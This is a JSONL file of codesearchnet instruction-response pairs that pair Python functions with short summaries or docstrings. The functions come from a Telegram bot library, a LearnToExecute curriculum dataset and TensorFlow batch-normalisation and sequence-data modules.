{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsend an inline query to the server.", "response": "def answer_inline_query(self, inline_query_id, results, cache_time=None, is_personal=None, next_offset=None,\n                            switch_pm_text=None, switch_pm_parameter=None):\n        \"\"\"\n        Use this method to send answers to an inline query. On success, True is returned.\n        No more than 50 results per query are allowed.\n        :param inline_query_id: Unique identifier for the answered query\n        :param results: Array of results for the inline query\n        :param cache_time: The maximum amount of time in seconds that the result of the inline query may be cached on the server.\n        :param is_personal: Pass True, if results may be cached on the server side only for the user that sent the query.\n        :param next_offset: Pass the offset that a client should send in the next query with the same text to receive more results.\n        :param switch_pm_parameter: If passed, clients will display a button with specified text that switches the user\n         to a private chat with the bot and sends the bot a start message with the parameter switch_pm_parameter\n        :param switch_pm_text: \tParameter for the start message sent to the bot when user presses the switch button\n        :return: True means success.\n        \"\"\"\n        return apihelper.answer_inline_query(self.token, inline_query_id, results, cache_time, is_personal, next_offset,\n                                             switch_pm_text, switch_pm_parameter)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef answer_callback_query(self, callback_query_id, text=None, show_alert=None, url=None, cache_time=None):\n        return apihelper.answer_callback_query(self.token, callback_query_id, text, show_alert, url, cache_time)", "response": "Send an answer to a callback query."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting a specific sticker set by its name.", "response": "def get_sticker_set(self, name):\n        \"\"\"\n        Use this method to get a sticker set. On success, a StickerSet object is returned.\n        :param name:\n        :return:\n        \"\"\"\n        result = apihelper.get_sticker_set(self.token, name)\n        return types.StickerSet.de_json(result)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nuploading a. png file with a sticker to a new StickerSet.", "response": "def upload_sticker_file(self, user_id, png_sticker):\n        \"\"\"\n        Use this method to upload a .png file with a sticker for later use in createNewStickerSet and addStickerToSet\n        methods (can be used multiple times). Returns the uploaded File on success.\n        :param user_id:\n        :param png_sticker:\n        :return:\n        \"\"\"\n        result = apihelper.upload_sticker_file(self.token, user_id, png_sticker)\n        return types.File.de_json(result)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create_new_sticker_set(self, user_id, name, title, png_sticker, emojis, contains_masks=None,\n                               mask_position=None):\n        \"\"\"\n        Use this method to create new sticker set owned by a user. The bot will be able to edit the created sticker set.\n        Returns True on success.\n        :param user_id:\n        :param name:\n        :param title:\n        :param png_sticker:\n        :param emojis:\n        :param contains_masks:\n        :param mask_position:\n        :return:\n        \"\"\"\n        return apihelper.create_new_sticker_set(self.token, user_id, name, title, png_sticker, emojis, contains_masks,\n                                                mask_position)", "response": "This method creates a new sticker set owned by a user."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_sticker_to_set(self, user_id, name, png_sticker, emojis, mask_position=None):\n        return apihelper.add_sticker_to_set(self.token, user_id, name, png_sticker, emojis, mask_position)", "response": "Add a new sticker to a set."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_sticker_position_in_set(self, sticker, position):\n        return apihelper.set_sticker_position_in_set(self.token, sticker, position)", "response": "Move a sticker in a specific set."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef register_for_reply(self, message, callback, *args, **kwargs):\n        message_id = message.message_id\n        self.register_for_reply_by_message_id(message_id, callback, *args, **kwargs)", "response": "Registers a callback function to be notified when a reply to a message arrives."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef register_for_reply_by_message_id(self, message_id, callback, *args, **kwargs):\n        if message_id in self.reply_handlers.keys():\n            self.reply_handlers[message_id].append(Handler(callback, *args, **kwargs))\n        else:\n            self.reply_handlers[message_id] = [Handler(callback, *args, **kwargs)]\n        if self.reply_saver is not None:\n            self.reply_saver.start_save_timer()", "response": "Registers a callback function to be notified when a reply to a message."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nregisters a callback function to be notified when new message arrives after message.", "response": "def register_next_step_handler(self, message, callback, *args, **kwargs):\n        \"\"\"\n        Registers a callback function to be notified when new message arrives after `message`.\n\n        Warning: In case `callback` as lambda function, saving next step handlers will not work.\n\n        :param message:     The message for which we want to handle new message in the same chat.\n        :param callback:    The callback function which next new message arrives.\n        :param args:        Args to pass in callback func\n        :param kwargs:      Args to pass in callback func\n        \"\"\"\n        chat_id = message.chat.id\n        self.register_next_step_handler_by_chat_id(chat_id, callback, *args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef register_next_step_handler_by_chat_id(self, chat_id, callback, *args, **kwargs):\n        if chat_id in self.next_step_handlers.keys():\n            self.next_step_handlers[chat_id].append(Handler(callback, *args, **kwargs))\n        else:\n            self.next_step_handlers[chat_id] = [Handler(callback, *args, **kwargs)]\n\n        if self.next_step_saver is not None:\n            self.next_step_saver.start_save_timer()", "response": "Registers a callback function to be notified when new message arrives after a chat."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef clear_step_handler(self, message):\n        chat_id = message.chat.id\n        self.clear_step_handler_by_chat_id(chat_id)", "response": "Clears all callback functions registered by register_next_step_handler."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef clear_step_handler_by_chat_id(self, chat_id):\n        self.next_step_handlers[chat_id] = []\n\n        if self.next_step_saver is not None:\n            self.next_step_saver.start_save_timer()", "response": "Clears all callback functions registered by register_next_step_handler."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nclears all callback functions registered by register_for_reply and register_for_reply_by_message_id.", "response": "def clear_reply_handlers_by_message_id(self, message_id):\n        \"\"\"\n        Clears all callback functions registered by register_for_reply() and register_for_reply_by_message_id().\n\n        :param message_id: The message id for which we want to clear reply handlers\n        \"\"\"\n        self.reply_handlers[message_id] = []\n\n        if self.reply_saver is not None:\n            self.reply_saver.start_save_timer()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmessages handler decorator. This decorator can be used to decorate functions that must handle certain types of messages. All message handlers are tested in the order they were added. Example: bot = TeleBot('TOKEN') # Handles all messages which text matches regexp. @bot.message_handler(regexp='someregexp') def command_help(message): bot.send_message(message.chat.id, 'Did someone call for help?') # Handle all sent documents of type 'text/plain'. @bot.message_handler(func=lambda message: message.document.mime_type == 'text/plain', content_types=['document']) def command_handle_document(message): bot.send_message(message.chat.id, 'Document received, sir!') # Handle all other commands. @bot.message_handler(func=lambda message: True, content_types=['audio', 'video', 'document', 'text', 'location', 'contact', 'sticker']) def default_command(message): bot.send_message(message.chat.id, \"This is the default command handler.\") :param regexp: Optional regular expression. :param func: Optional lambda function. The lambda receives the message to test as the first parameter. It must return True if the command should handle the message. :param content_types: This commands' supported content types. Must be a list. Defaults to ['text'].", "response": "def message_handler(self, commands=None, regexp=None, func=None, content_types=['text'], **kwargs):\n        \"\"\"\n        Message handler decorator.\n        This decorator can be used to decorate functions that must handle certain types of messages.\n        All message handlers are tested in the order they were added.\n\n        Example:\n\n        bot = TeleBot('TOKEN')\n\n        # Handles all messages which text matches regexp.\n        @bot.message_handler(regexp='someregexp')\n        def command_help(message):\n            bot.send_message(message.chat.id, 'Did someone call for help?')\n\n        # Handle all sent documents of type 'text/plain'.\n        @bot.message_handler(func=lambda message: message.document.mime_type == 'text/plain', content_types=['document'])\n        def command_handle_document(message):\n            bot.send_message(message.chat.id, 'Document received, sir!')\n\n        # Handle all other commands.\n        @bot.message_handler(func=lambda message: True, content_types=['audio', 'video', 'document', 'text', 'location', 'contact', 'sticker'])\n        def default_command(message):\n            bot.send_message(message.chat.id, \"This is the default command handler.\")\n\n        :param regexp: Optional regular expression.\n        :param func: Optional lambda function. The lambda receives the message to test as the first parameter. It must return True if the command should handle the message.\n        :param content_types: This commands' supported content types. Must be a list. Defaults to ['text'].\n        \"\"\"\n\n        def decorator(handler):\n            handler_dict = self._build_handler_dict(handler,\n                                                    commands=commands,\n                                                    regexp=regexp,\n                                                    func=func,\n                                                    content_types=content_types,\n                                                    **kwargs)\n\n            self.add_message_handler(handler_dict)\n\n            return handler\n\n        return decorator"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef generate_code(max_length, max_nest, ops):\n  stack = []\n  def fetch_one():\n    # Always use an existing nested value for one of the operands.\n    if stack:\n      return stack.pop()\n    else:\n      # Produce a numeral of max_length-digits.\n      value = random.randint(10 ** (max_length - 1), 10 ** max_length - 1)\n      code = str(value)\n      return value, code\n\n  def fetch(num_operands):\n    values, codes = zip(*[fetch_one() for _ in six.moves.range(num_operands)])\n    return values, codes\n\n  for _ in six.moves.range(max_nest):\n    op = random.choice(ops)\n    values, codes = fetch(op.num_operands)\n    new_value = op.eval(values)\n    new_code = op.get_code(codes)\n    stack.append((new_value, \"(\" + new_code + \")\"))\n  final_value, final_code = stack.pop()\n  final_code = final_code[1:-1]\n  final_code.strip(\"()\")\n  if not op.is_memory:\n    final_value = int(final_value) % 10 ** (max_length+1)\n  return str(final_value), final_code", "response": "Generates code samples.\n\n  Args:\n    max_length: int.  max literal length.\n    max_nest: int. max nesting level.\n    ops: CodeOp. set of allowable operations.\n\n  Returns:\n    1. (str) output value.\n    2. (str) Code operation."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_tokens(max_value):\n  vocab = [str(i) for i in range(max_value)]\n  vocab = set(vocab)\n  vocab.update(CodeOp.LITERALS)\n  vocab.update(CodeOp.KEYWORDS)\n  vocab |= set(\"\".join(vocab))\n  return sorted(vocab)", "response": "Defines tokens.\n Returns a list of string tokens in vocabulary."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef LearnToExecute(   # pylint: disable=invalid-name\n    batch_size, max_length=1, max_nesting=1, token_by_char=True,\n    mode=Mode.TRAIN_COMBINE, loss_threshold=0.1,\n    min_tries=DEFAULT_MIN_CURRICULUM_EVAL_TRIES, task_type=TaskType.ALG_CTRL):\n  \"\"\"Factory method for LearnToExecute Dataset module.\n\n  Args:\n    batch_size: (int). The number of elements in a mini-batch.\n    max_length: (int). Maximum character length.\n    max_nesting: (int). Maximum level of statement nesting.\n    token_by_char: (bool). Tokenize by character or words?\n    mode: (string). Either 'train', 'test'.\n    loss_threshold: (int) curriculum threshold for error below which increase\n        the task difficulty.\n    min_tries: (int) minimum update tries for curriculum difficulty level.\n    task_type: (string) defines the task by allowable ops (see TASK_TYPE_OPS).\n\n  Returns:\n    tf.Data.Dataset for LearnToExecute sample generator with the\n    LearnToExecuteState monkey patched into the `state` attribute.\n\n  Raises:\n    ValueError: in case of bad `mode`.\n  \"\"\"\n  # defaults mode to \"train-combine\"\n  if mode == Mode.TRAIN_COMBINE:\n    curriculum = CombineCurriculum(\n        max_length, max_nesting, loss_threshold, min_tries=min_tries)\n  elif mode == Mode.TRAIN_MIX:\n    curriculum = MixCurriculum(\n        max_length, max_nesting, loss_threshold, min_tries=min_tries)\n  elif mode == Mode.TRAIN_NAIVE:\n    curriculum = NaiveCurriculum(\n        max_length, max_nesting, loss_threshold, min_tries=min_tries)\n  elif mode == Mode.TEST:\n    curriculum = BaselineCurriculum(\n        max_length, max_nesting, loss_threshold, min_tries=0)\n  else:\n    raise ValueError(\"Invalid mode.\")\n  lte = LearnToExecuteState(batch_size, max_length, max_nesting,\n                            curriculum, token_by_char, task_type=task_type)\n  types_ = (tf.float32, tf.float32, tf.float32, tf.int64, tf.int64)\n  shapes_ = (tf.TensorShape([lte.num_steps, batch_size, lte.vocab_size]),\n             tf.TensorShape([lte.num_steps_out, batch_size, lte.vocab_size]),\n             tf.TensorShape([lte.num_steps_out, batch_size, lte.vocab_size]),\n             tf.TensorShape([batch_size,]),\n             tf.TensorShape([batch_size,]))\n  dataset = tf.data.Dataset.from_generator(lte.make_batch, types_, shapes_)\n  dataset.state = lte\n  return dataset", "response": "Factory method for LearnToExecute Dataset module.\n\n  Args:\n    batch_size: (int). The number of elements in a mini-batch.\n    max_length: (int). Maximum character length.\n    max_nesting: (int). Maximum level of statement nesting.\n    token_by_char: (bool). Tokenize by character or words?\n    mode: (string). Either 'train', 'test'.\n    loss_threshold: (int) curriculum threshold for error below which increase\n        the task difficulty.\n    min_tries: (int) minimum update tries for curriculum difficulty level.\n    task_type: (string) defines the task by allowable ops (see TASK_TYPE_OPS).\n\n  Returns:\n    tf.Data.Dataset for LearnToExecute sample generator with the\n    LearnToExecuteState monkey patched into the `state` attribute.\n\n  Raises:\n    ValueError: in case of bad `mode`."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self):\n    length = np.random.randint(1, self._max_length + 1)\n    nesting = np.random.randint(1, self._max_length + 1)\n    return length, nesting", "response": "Samples up to maximum difficulty."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nincrements level difficulty by 1 until maximum.", "response": "def update(self, loss, force=False):\n    \"\"\"Increments level difficulty (length and nesting) by 1 until maximum.\"\"\"\n    do_update = super(CombineCurriculum, self).update(loss, force)\n    if not do_update:\n      return False\n\n    if self._curr_length < self._max_length:\n      self._curr_length += 1\n    elif self._curr_nesting < self._max_nesting:\n      self._curr_nesting += 1\n    else:\n      self._set_new_task = False\n\n    if self._set_new_task:\n      tf.logging.info(\"New level: (length=%d, nesting=%d)\",\n                      self._curr_length, self._curr_nesting)\n    return self._set_new_task"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fetch(self):\n    length = np.random.randint(1, self._curr_length + 1)\n    nesting = np.random.randint(1, self._curr_nesting + 1)\n    return length, nesting", "response": "Samples up to current difficulty."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef generate_flat_data(self):\n    # Construct the string statements.\n    all_statements = []\n    all_targets = []\n    self.sequence_sizes_in = []\n    self.sequence_sizes_out = []\n    for _ in six.moves.range(self._batch_size):\n      length, nest = self.curriculum_obj.fetch()\n      seq_size_in = self._max_seq_length\n      # Generate batch within max length.\n      is_valid_sample = False\n      tries_remaining = 10\n      while not is_valid_sample:\n        value, code = generate_code(length, nest, self._ops)\n        tokens_in, seq_size_in = self.tokenize(\n            code, self._max_seq_length, self._token_by_char)\n        tokens_out, seq_size_out = self.tokenize(\n            value, self._max_seq_length, self._token_by_char)\n        is_valid_sample = self._max_seq_length >= seq_size_in\n        if is_valid_sample:\n          self.sequence_sizes_in.append(seq_size_in)\n          self.sequence_sizes_out.append(seq_size_out)\n        if tries_remaining == 0:\n          raise ValueError(\"Could not generate a sample below the allowable \"\n                           \"maximum, consider reducing either max_length or \"\n                           \"max_nest.\")\n        else:\n          tries_remaining -= 1\n      all_statements += tokens_in\n      all_targets += tokens_out\n    # Store the flattened data.\n    self.flat_data = np.array(all_statements, dtype=np.int64)\n    self.num_tokens = self.flat_data.shape[0]\n    self.flat_targets = np.array(all_targets, dtype=np.int64)\n    self.num_tokens_target = self.flat_targets.shape[0]\n    self.start_token = np.array(self.tokenize(\n        [get_start_token()], 1)[0], dtype=np.int64)\n    self.end_token = np.array(self.tokenize(\n        [get_end_token()], 1)[0], dtype=np.int64)", "response": "Generates batched data in flat numpy arrays."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef tokenize(self, char_input, max_len, by_char=False):\n    if by_char:\n      tokenized_list = [self._vocab_dict[token] for token in char_input]\n    else:\n      tokenized_list = []\n      compound_token = \"\"\n      for token in char_input:\n        # Compose alphanumeric inputs into compound tokens.\n        add_number = compound_token.isdigit() and not token.isdigit()\n        add_word = compound_token.isalpha() and not token.isalpha()\n        if add_number or add_word:\n          tokenized_list.append(self._vocab_dict[compound_token])\n          compound_token = \"\"\n        # Add token or build compound token.\n        if token.isdigit():\n          compound_token += token\n        elif token.isalpha():\n          compound_token += token\n        else:\n          tokenized_list.append(self._vocab_dict[token])\n      if compound_token:\n        tokenized_list.append(self._vocab_dict[compound_token])\n\n    # To ensure uniform batch sequence length pad the sequence.\n    seq_size = len(tokenized_list)\n    if seq_size < max_len:\n      padding = [self._vocab_dict[get_padding()]] * (max_len - seq_size)\n      tokenized_list.extend(padding)\n    elif seq_size > max_len:\n      raise ValueError(\"Token sequence is too large: {}\".format(\n          len(tokenized_list)))\n\n    return tokenized_list, seq_size", "response": "Takes a character string and returns a list of integer indices corresponding to a token list."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn an operations list based on the specified task type.", "response": "def get_task_ops(task_type=TaskType.ALG_CTRL):\n    \"\"\"Returns an operations list based on the specified task index.\n\n    Args:\n      task_type: indicates the task type used.\n\n    Returns:\n      List of the eligible ops.\n    \"\"\"\n    try:\n      return LearnToExecuteState.TASK_TYPE_OPS[task_type]\n    except KeyError:\n      raise KeyError(\"Bad task_type '%s', check config.\" % task_type)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef make_batch(self):\n    while True:\n      self.reset_data_source()\n      obs = np.reshape(self._data_source.flat_data,\n                       [self.batch_size, -1])[:, :self._num_steps].T\n      target = np.reshape(\n          self._data_source.flat_targets,\n          [self.batch_size, -1])[:, :self._num_steps_out].T\n      start_tokens = np.ndarray([1, self.batch_size], dtype=np.int32)\n      start_tokens.fill(self._data_source.start_token[0])\n      target_in = np.concatenate((start_tokens, target[:-1, :]), axis=0)\n      yield (self._np_one_hot(obs, self._num_steps),\n             self._np_one_hot(target, self._num_steps_out),\n             self._np_one_hot(target_in, self._num_steps_out),\n             self.seq_sizes_in,\n             self.seq_sizes_out)", "response": "Generates a batch of data for learning."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a human - readable version of a one - hot encoding of words.", "response": "def to_human_readable(self, data, label_batch_entries=True, indices=None,\n                        sep=\"\\n\"):\n    \"\"\"Returns a human-readable version of a one-hot encoding of words.\n\n    Args:\n      data: (numpy.ndarray S x B x OH). One-hot encoding of words. S is\n          sequence length, B is batch size, OH is one hot dimensionality.\n      label_batch_entries: (bool). Whether to add numerical label before each\n          batch element in the output string.\n      indices: (list(int) or None). Used to select a subset of minibatch indices\n          to print. None will print the whole minibatch.\n      sep: (str) separator which separates the output for each batch. Defaults\n          to the newline character.\n\n    Returns:\n      String composed from the data.\n    \"\"\"\n    batch_size = data.shape[1]\n    result = []\n    indices = indices or six.moves.range(batch_size)\n    for b in indices:\n      index_seq = np.argmax(data[:, b], axis=1)\n      prefix = \"b_{}: \".format(b) if label_batch_entries else \"\"\n      result.append(prefix + self._data_source.decode_to_string(index_seq))\n    return sep.join(result)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _infer_fused_data_format(self, input_batch):\n    input_shape = input_batch.get_shape().as_list()\n    input_shape_len = len(input_shape)\n    if input_shape_len != 4:\n      raise NotImplementedError(\"fused batch norm supports only input with \"\n                                \"4 dimensions, it received input of \"\n                                \"dimensionality {:d}\".format(input_shape_len))\n    axis = range(input_shape_len)[:-1] if self._axis is None else self._axis\n    axis = tuple(axis)\n    if axis == (0, 1, 2):\n      # Reduce over the last dimension.\n      return \"NHWC\"\n    elif axis == (0, 2, 3):\n      # Reduce over the second dimension.\n      return \"NCHW\"\n    else:\n      raise ValueError(\"Invalid axis option {}. This does not correspond to\"\n                       \" either the NHWC format (0, 1, 2) or the NCHW \"\n                       \"(0, 2, 3).\".format(axis))", "response": "Infer the data format for the fused batch norm."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _fused_batch_norm_op(self, input_batch, mean, variance, use_batch_stats):\n    # Store the original shape of the mean and variance.\n    mean_shape = mean.get_shape()\n    variance_shape = variance.get_shape()\n    # The fused batch norm expects the mean, variance, gamma and beta\n    # tensors to have dimension 1, so we flatten them to remove the\n    # extra dimensions.\n    gamma_flatten = tf.reshape(self._gamma, shape=(-1,))\n    beta_flatten = tf.reshape(self._beta, shape=(-1,))\n    flatten_mean = tf.reshape(mean, shape=(-1,))\n    flatten_variance = tf.reshape(variance, shape=(-1,))\n    use_batch_stats = tf.convert_to_tensor(use_batch_stats)\n\n    common_args = {\n        \"scale\": gamma_flatten,\n        \"offset\": beta_flatten,\n        \"epsilon\": self._eps,\n        \"data_format\": self._infer_fused_data_format(input_batch),\n        \"name\": \"batch_norm\"\n    }\n\n    def use_batch_stats_fused_batch_norm():\n      return tf.nn.fused_batch_norm(input_batch, mean=None, variance=None,\n                                    is_training=True, **common_args)\n\n    def moving_average_fused_batch_norm():\n      return tf.nn.fused_batch_norm(input_batch, mean=flatten_mean,\n                                    variance=flatten_variance,\n                                    is_training=False, **common_args)\n\n    batch_norm_op, mean, variance = utils.smart_cond(\n        use_batch_stats, use_batch_stats_fused_batch_norm,\n        moving_average_fused_batch_norm)\n\n    mean = tf.reshape(mean, mean_shape)\n    variance = tf.reshape(variance, variance_shape)\n    return batch_norm_op, mean, variance", "response": "Creates a fused batch normalization op."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _batch_norm_op(self, input_batch, mean, variance, use_batch_stats,\n                     stat_dtype):\n    \"\"\"Creates a batch normalization op.\n\n    It uses the tf.nn.batch_normalization op by default and the\n    tf.nn.fused_batch_norm op to support fused batch normalization.\n\n    Args:\n      input_batch: A input Tensor of arbitrary dimension.\n      mean: A mean tensor, of the same dtype as `input_batch`.\n      variance: A variance tensor, of the same dtype as `input_batch`.\n      use_batch_stats: A bool value that indicates whether the operation should\n         use the batch statistics.\n      stat_dtype: TensorFlow datatype used for the moving mean and variance.\n\n    Returns:\n      A batch normalization operation.\n      The current mean tensor, of datatype `stat_dtype`.\n      The current variance tensor, of datatype `stat_dtype`.\n    \"\"\"\n    if self._fused:\n      # For the non-training case where not using batch stats,\n      # pass in the moving statistic variables directly.\n      # These will already be in the correct dtype, even for float16 input.\n      batch_norm_op, mean, variance = self._fused_batch_norm_op(\n          input_batch,\n          self._moving_mean, self._moving_variance, use_batch_stats)\n    else:\n      batch_norm_op = tf.nn.batch_normalization(\n          input_batch,\n          mean,\n          variance,\n          self._beta,\n          self._gamma,\n          self._eps,\n          name=\"batch_norm\")\n      # We'll echo the supplied mean and variance so that they can also be used\n      # to update the moving statistics. Cast to matching type if necessary.\n      if input_batch.dtype.base_dtype != stat_dtype:\n        mean = tf.cast(mean, stat_dtype)\n        variance = tf.cast(variance, stat_dtype)\n\n    return batch_norm_op, mean, variance", "response": "Creates a batch normalization op."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nset up optional scale and offset factors.", "response": "def _build_scale_offset(self, dtype):\n    \"\"\"Sets up optional scale and offset factors.\"\"\"\n\n    # tf.nn.fused_batch_norm accepts float16 batch data, but not scale/offset.\n    if self._fused and dtype == tf.float16:\n      dtype = tf.float32\n\n    # The fused batch norm operation needs the beta, gamma variables,\n    # so in this case we build them and set the trainable option according\n    # to the values of _offset and _scale.\n    self._beta = None\n    if self._offset or self._fused:\n      if self.BETA not in self._initializers:\n        self._initializers[self.BETA] = create_beta_initializer()\n      self._beta = tf.get_variable(\n          self.BETA,\n          dtype=dtype,\n          shape=self._mean_shape,\n          initializer=self._initializers[self.BETA],\n          partitioner=self._partitioners.get(self.BETA, None),\n          regularizer=self._regularizers.get(self.BETA, None),\n          trainable=self._offset)\n\n    self._gamma = None\n    if self._scale or self._fused:\n      if self.GAMMA not in self._initializers:\n        self._initializers[self.GAMMA] = create_gamma_initializer()\n      self._gamma = tf.get_variable(\n          self.GAMMA,\n          dtype=dtype,\n          shape=self._mean_shape,\n          initializer=self._initializers[self.GAMMA],\n          partitioner=self._partitioners.get(self.GAMMA, None),\n          regularizer=self._regularizers.get(self.GAMMA, None),\n          trainable=self._scale)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconnects the BatchNorm module into the graph.", "response": "def _build(self, input_batch, is_training, test_local_stats=True):\n    \"\"\"Connects the BatchNorm module into the graph.\n\n    Args:\n      input_batch: A Tensor of arbitrary dimension. By default, the final\n        dimension is not reduced over when computing the minibatch statistics.\n      is_training: A boolean to indicate if the module should be connected in\n        training mode, meaning the moving averages are updated. Can be a Tensor.\n      test_local_stats: A boolean to indicate if local batch statistics should\n        be used when `is_training=False`. If not, moving averages are used.\n        By default `True`. Can be a Tensor.\n\n    Returns:\n      A tensor with the same shape as `input_batch`.\n\n    Raises:\n      base.IncompatibleShapeError: If `axis` is not valid for the\n        input shape or has negative entries.\n      base.NotSupportedError: If `input_batch` has data type of `tf.bfloat16`.\n    \"\"\"\n    input_shape = input_batch.get_shape()\n\n    if self._axis is not None:\n      if len(self._axis) > len(input_shape):\n        raise base.IncompatibleShapeError(\n            \"Too many indices specified in axis: len({}) > len({}).\".format(\n                self._axis, input_shape))\n\n      if max(self._axis) >= len(input_shape):\n        raise base.IncompatibleShapeError(\n            \"One or more index in axis is too large for \"\n            \"input shape: {} >= {:d}.\".format(self._axis, len(input_shape)))\n\n      if min(self._axis) < 0:\n        raise base.IncompatibleShapeError(\n            \"Indices in axis must be non-negative: {} < 0.\".format(\n                self._axis))\n\n      axis = self._axis\n    else:\n      # Reduce over all dimensions except the last.\n      axis = tuple(range(len(input_shape))[:-1])\n\n    dtype = input_batch.dtype.base_dtype\n    if self._fused and dtype == tf.bfloat16:\n      raise base.NotSupportedError(\n          \"Fused batch norm does not support tf.bfloat16.\")\n    # Maintain moving averages at a minimum precision of tf.float32.\n    stat_dtype = tf.float32 if dtype in [tf.float16, tf.bfloat16] else dtype\n\n    self._mean_shape = input_batch.get_shape().as_list()\n    for index in axis:\n      self._mean_shape[index] = 1\n\n    use_batch_stats = is_training | test_local_stats\n\n    mean, variance = self._build_statistics(input_batch, axis,\n                                            use_batch_stats, stat_dtype)\n\n    # Sets up optional gamma and beta parameters\n    self._build_scale_offset(dtype)\n    # Sets up the batch normalization op.\n    out, mean, variance = self._batch_norm_op(input_batch, mean, variance,\n                                              use_batch_stats, stat_dtype)\n    # Sets up the update op.\n    update_ops = self._build_update_ops(mean, variance, is_training)\n\n    # Put update ops in the update ops collection if given, otherwise add as\n    # control dependencies of the output.\n    if update_ops:\n      if self._update_ops_collection:\n        for update_op in update_ops:\n          tf.add_to_collection(self._update_ops_collection, update_op)\n      else:\n        with tf.control_dependencies(update_ops):\n          out = tf.identity(out)\n\n    return out"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nproducing the list of integer indices corresponding to a token list.", "response": "def tokenize(self, token_list):\n    \"\"\"Produces the list of integer indices corresponding to a token list.\"\"\"\n    return [\n        self._vocab_dict.get(token, self._vocab_dict[self.UNK])\n        for token in token_list\n    ]"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_batch(self):\n    batch_indices = np.mod(\n        np.array([\n            np.arange(head_index, head_index + self._num_steps + 1) for\n            head_index in self._head_indices]),\n        self._n_flat_elements)\n\n    obs = np.array([\n        self._flat_data[indices[:self._num_steps]]\n        for indices in batch_indices]).T\n    target = np.array([\n        self._flat_data[indices[1:self._num_steps + 1]]\n        for indices in batch_indices]).T\n\n    if self._random_sampling:\n      self._reset_head_indices()\n    else:\n      self._head_indices = np.mod(\n          self._head_indices + self._num_steps, self._n_flat_elements)\n    return obs, target", "response": "Returns a batch of sequences."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild the sequence data ops.", "response": "def _build(self):\n    \"\"\"Returns a tuple containing observation and target one-hot tensors.\"\"\"\n    q = tf.FIFOQueue(\n        self._queue_capacity, [self._dtype, self._dtype],\n        shapes=[[self._num_steps, self._batch_size, self._vocab_size]]*2)\n    obs, target = tf.py_func(self._get_batch, [], [tf.int32, tf.int32])\n    obs = self._one_hot(obs)\n    target = self._one_hot(target)\n    enqueue_op = q.enqueue([obs, target])\n    obs, target = q.dequeue()\n    tf.train.add_queue_runner(tf.train.QueueRunner(q, [enqueue_op]))\n    return SequenceDataOpsNoMask(obs, target)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the cost for a sequence of logits and target.", "response": "def cost(self, logits, target):\n    \"\"\"Returns cost.\n\n    Args:\n      logits: model output.\n      target: target.\n\n    Returns:\n      Cross-entropy loss for a sequence of logits. The loss will be averaged\n      across time steps if time_average_cost was enabled at construction time.\n    \"\"\"\n    logits = tf.reshape(logits, [self._num_steps * self._batch_size, -1])\n    target = tf.reshape(target, [self._num_steps * self._batch_size, -1])\n    xent = tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=target)\n    loss = tf.reduce_sum(xent)\n\n    return loss / self._batch_size"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a human - readable version of a one - hot encoding of words.", "response": "def to_human_readable(self,\n                        data,\n                        label_batch_entries=True,\n                        indices=None,\n                        sep=\"\\n\"):\n    \"\"\"Returns a human-readable version of a one-hot encoding of words.\n\n    Args:\n      data: A tuple with (obs, target). `obs` is a numpy array with one-hot\n          encoding of words.\n      label_batch_entries: bool. Whether to add numerical label before each\n          batch element in the output string.\n      indices: List of int or None. Used to select a subset of minibatch indices\n          to print. None will print the whole minibatch.\n      sep: A char separator which separates the output for each batch. Defaults\n          to the newline character.\n\n    Returns:\n      String with the words from `data[0]`.\n    \"\"\"\n    obs = data[0]\n    batch_size = obs.shape[1]\n    result = []\n    indices = xrange(batch_size) if not indices else indices\n    for b in indices:\n      index_seq = np.argmax(obs[:, b], axis=1)\n      prefix = \"b_{}: \".format(b) if label_batch_entries else \"\"\n      result.append(prefix + self._data_source.decode(index_seq))\n    return sep.join(result)"}
